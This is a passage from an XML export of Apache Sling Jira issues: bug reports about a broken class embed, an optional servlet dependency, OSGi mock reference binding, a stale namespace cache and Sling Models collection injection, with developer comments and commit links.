                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 21 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1i8yg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11890] Fix embed of org.apache.sling.scripting.core.impl.helper.ProtectedBindings</title>
                <link>https://issues.apache.org/jira/browse/SLING-11890</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;the update to latest &lt;tt&gt;org.apache.sling.scripting.core&lt;/tt&gt; with &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11832&quot; title=&quot;Embed latest version of org.apache.sling.scripting.core to make use of LazyBindings&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11832&quot;&gt;&lt;del&gt;SLING-11832&lt;/del&gt;&lt;/a&gt; accidentally broke the embed, the relocated version of class &lt;tt&gt;org.apache.sling.scripting.core.impl.helper.ProtectedBindings&lt;/tt&gt; is no longer embed in the JAR.&lt;/p&gt;

&lt;p&gt;(i tested the version of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11832&quot; title=&quot;Embed latest version of org.apache.sling.scripting.core to make use of LazyBindings&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11832&quot;&gt;&lt;del&gt;SLING-11832&lt;/del&gt;&lt;/a&gt; locally, but whatever i did, i did not test it correctly obviously)&lt;/p&gt;</description>
                <environment></environment>
        <key id="13537835">SLING-11890</key>
            <summary>Fix embed of org.apache.sling.scripting.core.impl.helper.ProtectedBindings</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Fri, 26 May 2023 17:16:36 +0000</created>
                <updated>Fri, 2 Jun 2023 14:41:13 +0000</updated>
                            <resolved>Tue, 30 May 2023 08:49:01 +0000</resolved>
                                    <version>Models Implementation 1.6.2</version>
                                    <fixVersion>Models Implementation 1.6.4</fixVersion>
                                    <component>Sling Models</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17727408" author="sseifert@pro-vision.de" created="Tue, 30 May 2023 08:49:01 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-impl/commit/b24d5252d5362a048a6c549f81a870649719a9c9&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-impl/commit/b24d5252d5362a048a6c549f81a870649719a9c9&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13533027">SLING-11832</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 21 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1i67k:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11889] Make dependency on javax.servlet optional</title>
                <link>https://issues.apache.org/jira/browse/SLING-11889</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;As consequence of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11864&quot; title=&quot;Configuration merge/default values not considered in OSGi Installer Configuration Printer Web Console&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11864&quot;&gt;&lt;del&gt;SLING-11864&lt;/del&gt;&lt;/a&gt; the Installer Configuration Factory now depends on javax.servlet for the added web console plugin. As that really is an optional feature it should be marked as optional import-package.&lt;br/&gt;
Compare with discussion at &lt;a href=&quot;https://lists.apache.org/thread/lxbmzolm8nbt9t0szztbzd43vrj7gd3j&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://lists.apache.org/thread/lxbmzolm8nbt9t0szztbzd43vrj7gd3j&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13537784">SLING-11889</key>
            <summary>Make dependency on javax.servlet optional</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Fri, 26 May 2023 09:18:10 +0000</created>
                <updated>Fri, 26 May 2023 09:20:47 +0000</updated>
                            <resolved>Fri, 26 May 2023 09:20:47 +0000</resolved>
                                                    <fixVersion>Installer Configuration Factory 1.4.6</fixVersion>
                                    <component>Installer</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17726551" author="kwin" created="Fri, 26 May 2023 09:20:47 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-installer-factory-configuration/commit/e53f4a1362aee15df0cec30dd0bd83d1d9b32386&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-installer-factory-configuration/commit/e53f4a1362aee15df0cec30dd0bd83d1d9b32386&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13535374">SLING-11864</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 21 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1i5wg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11885] ResourceResolverFactoryActivator.bindResourceDecorator never called</title>
                <link>https://issues.apache.org/jira/browse/SLING-11885</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;If I register a custom &lt;tt&gt;ResourceDecorator&lt;/tt&gt; after the Sling Context has been initialized it will not trigger &lt;tt&gt;ResourceResolverFactoryActivator.bindResourceDecorator(...)&lt;/tt&gt; (&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/blob/master/src/main/java/org/apache/sling/resourceresolver/impl/ResourceResolverFactoryActivator.java#L608&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/blob/master/src/main/java/org/apache/sling/resourceresolver/impl/ResourceResolverFactoryActivator.java#L608&lt;/a&gt;) and therefore my &lt;tt&gt;ResourceDecorator&lt;/tt&gt; will never be called.&lt;/p&gt;

&lt;p&gt;This happens in &lt;a href=&quot;https://github.com/Adobe-Consulting-Services/acs-aem-commons/blob/e2740ca63aac981f40763917a5ec879aa2a75156/bundle/src/test/java/com/adobe/acs/commons/remoteassets/impl/RemoteAssetDecoratorTest.java#L110&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/Adobe-Consulting-Services/acs-aem-commons/blob/e2740ca63aac981f40763917a5ec879aa2a75156/bundle/src/test/java/com/adobe/acs/commons/remoteassets/impl/RemoteAssetDecoratorTest.java#L110&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13536572">SLING-11885</key>
            <summary>ResourceResolverFactoryActivator.bindResourceDecorator never called</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="3">Duplicate</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Wed, 17 May 2023 13:43:35 +0000</created>
                <updated>Wed, 17 May 2023 16:58:30 +0000</updated>
                            <resolved>Wed, 17 May 2023 16:30:02 +0000</resolved>
                                    <version>Testing OSGi Mock 3.3.6</version>
                                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17723513" author="kwin" created="Wed, 17 May 2023 15:34:14 +0000"  >&lt;p&gt;The problem seems to be that dynamic references are only found in &lt;tt&gt;OsgiServiceUtil.getMatchingDynamicReferences&lt;/tt&gt; if they are contained in components implementing services. But also components not implementing any services (in this case the ResourceResolverFactoryActivator) might have dynamic references which need to be considered here!&lt;/p&gt;</comment>
                            <comment id="17723515" author="kwin" created="Wed, 17 May 2023 15:37:06 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; Where are reference to active SCR components being maintained (inside MockBundleContext or somewhere else) currently? Is it only through the &lt;tt&gt;registeredServicesMap&lt;/tt&gt; which contains references towards them? If so that need to be changed to properly deal with SCR components which do not implement a single service. Also across bundle contexts dynamic references need to be updated. Probably a singleton component registry needs to be introduced which is evaluated for dynamic references.&lt;/p&gt;</comment>
                            <comment id="17723528" author="kwin" created="Wed, 17 May 2023 16:03:49 +0000"  >&lt;p&gt;The more I dig into the source code the more confused I am, it seems that &lt;tt&gt;OsgiServiceUtil&lt;/tt&gt; actually deals with DS components and not plain OSGi services. Whether those components actually implement OSGi services themselves seem to be irrelevant for methods implemented in that class. All concepts mentioned there like&lt;/p&gt;
&lt;ul class=&quot;alternate&quot; type=&quot;square&quot;&gt;
	&lt;li&gt;references&lt;/li&gt;
	&lt;li&gt;activate/deactivate methods&lt;/li&gt;
	&lt;li&gt;field/constructor injection&lt;br/&gt;
are actually all applicable only to OSGi DS (&lt;a href=&quot;https://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.component.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.component.html&lt;/a&gt;) but not to arbitrary OSGi service implementations.&lt;/li&gt;
&lt;/ul&gt;
</comment>
                            <comment id="17723531" author="sseifert@pro-vision.de" created="Wed, 17 May 2023 16:25:00 +0000"  >&lt;p&gt;yes, the problem is related to &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11668&quot; title=&quot;[osgi-mocks] Dynamic service references not updated on osgi Components&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11668&quot;&gt;SLING-11668&lt;/a&gt; and earlier findings. the current osgi-mock implementation does not correctly implement a &quot;component registry&quot; but only a &quot;service registry&quot; which is conceptional wrong (for historical reasons). i&apos;ve it on my todo-list to refactor this and implement it as a component registry, but did not have time so far. i&apos;ve loosly planned to do it within the next months / this year!&lt;/p&gt;</comment>
                            <comment id="17723534" author="kwin" created="Wed, 17 May 2023 16:30:29 +0000"  >&lt;p&gt;I see, thanks for the pointer. Any proposal for a workaround to make custom ResourceDecorators work?&lt;/p&gt;

&lt;p&gt;FTR: I used the following workaround:&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
ResourceResolverFactory rrFactory = context.getService(ResourceResolverFactory.class);
        &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt; (rrFactory &lt;span class=&quot;code-keyword&quot;&gt;instanceof&lt;/span&gt; ResourceResolverFactoryImpl) {
            &lt;span class=&quot;code-comment&quot;&gt;// use reflection to get CommonResourceResolverFactoryImpl
&lt;/span&gt;            Field crrFactoryField = ResourceResolverFactoryImpl.&lt;span class=&quot;code-keyword&quot;&gt;class.&lt;/span&gt;getDeclaredField(&lt;span class=&quot;code-quote&quot;&gt;&quot;commonFactory&quot;&lt;/span&gt;);
            crrFactoryField.setAccessible(&lt;span class=&quot;code-keyword&quot;&gt;true&lt;/span&gt;);
            CommonResourceResolverFactoryImpl commonFactory = (CommonResourceResolverFactoryImpl) crrFactoryField.get(rrFactory);
            commonFactory.getResourceDecoratorTracker().bindResourceDecorator(&amp;lt;myResourceDecorator&amp;gt;, Collections.emptyMap());
        }
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                            <outwardlinks description="duplicates">
                                        <issuelink>
            <issuekey id="13499149">SLING-11668</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hyfk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11883] JcrModifiableValueMap&apos;s cached copy of namespace prefixes is never refreshed</title>
                <link>https://issues.apache.org/jira/browse/SLING-11883</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Ran into this bug in patching metadata on a resource. Patched property has unregistered namespace. Since user session does not have enough permissions to create namespace, we used a service session to register a new namespace, after that refreshed the user session, and then created a new resource resolver from that user session. Now when we patch the metadata properties we use something similar to this&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
ModifiableValueMap valueMap = resource.get().adaptTo(ModifiableValueMap.class);  valueMap.put(propertyName, value);&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;`resolver.commit()` is called after patching. Commit does not recognize the registered namespace which causes an encoded colon in the property name.&#160;&lt;/p&gt;

&lt;p&gt;Reason: &lt;br/&gt;
JcrModifiableValueMap (an implementation of ModifiableValueMap) uses &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/4ab953bf5debe2c60e1c531dc5f8f6aeb2d7414e/src/main/java/org/apache/sling/jcr/resource/internal/HelperData.java#L50&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;escapeKeyName function in HelperData&lt;/a&gt; class which has a cached copy of namespace prefixes that never sees the latest changes.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/a1f5532981a118470c74afdba217fa480c1e0cec/src/main/java/org/apache/sling/jcr/resource/internal/JcrModifiableValueMap.java#L65&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/a1f5532981a118470c74afdba217fa480c1e0cec/src/main/java/org/apache/sling/jcr/resource/internal/JcrModifiableValueMap.java#L65&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13536457">SLING-11883</key>
            <summary>JcrModifiableValueMap&apos;s cached copy of namespace prefixes is never refreshed</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="ashrigo">Amit Shrigondekar</reporter>
                        <labels>
                    </labels>
                <created>Tue, 16 May 2023 20:22:33 +0000</created>
                <updated>Wed, 17 May 2023 05:34:59 +0000</updated>
                                                                                <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17723346" author="cziegeler" created="Wed, 17 May 2023 05:34:59 +0000"  >&lt;p&gt;I think it makes sense to refresh (clear) the cache in HelperData when RR.refresh is called&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hxq0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11881] @ChildResource Collection&lt;MyModel&gt; in combination with @PostConstruct Boolean method causes the injection of an empty collection, instead of a collection with all successful items</title>
                <link>https://issues.apache.org/jira/browse/SLING-11881</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Let&apos;s say we have a Sling Model with a parameter:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
@ChildResource(name = &lt;span class=&quot;code-quote&quot;&gt;&quot;links&quot;&lt;/span&gt;, injectionStrategy = OPTIONAL) &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; Collection&amp;lt;Link&amp;gt; links)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And Link is implemented as follows:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
@Model(adaptables = Resource.class, adapters = LinkModel.class)
&lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;class &lt;/span&gt;Link {
    &lt;span class=&quot;code-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt; url;

    @Inject
    &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; LinkModel(@ValueMapValue(name = &lt;span class=&quot;code-quote&quot;&gt;&quot;url&quot;&lt;/span&gt;, injectionStrategy = InjectionStrategy.OPTIONAL) &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt; url) {
        &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.url = url;
    }

    @PostConstruct
    &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-object&quot;&gt;boolean&lt;/span&gt; activate() {
        &lt;span class=&quot;code-comment&quot;&gt;// Returning &lt;span class=&quot;code-keyword&quot;&gt;false&lt;/span&gt; here indicates that the model is not valid (&lt;span class=&quot;code-keyword&quot;&gt;null&lt;/span&gt; will be returned, instead of the instantiated model)
&lt;/span&gt;        &lt;span class=&quot;code-keyword&quot;&gt;return&lt;/span&gt; StringUtils.isNotEmpty(url);
    }
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In case the content structure looks like this:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
links/item0/jcr:primaryType=nt:unstructured
links/item0/url=test0
links/item1/jcr:primaryType=nt:unstructured
links/item2/jcr:primaryType=nt:unstructured
links/item2/url=test2
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I would expect the following to be the value of the @ChildResource parameter, when adapting:&lt;br/&gt;
links=&lt;span class=&quot;error&quot;&gt;&amp;#91;url=test0, url=test2&amp;#93;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;However, an empty collection is injected instead.&lt;/p&gt;

&lt;p&gt;I believe this is because of the following lines:&lt;br/&gt;
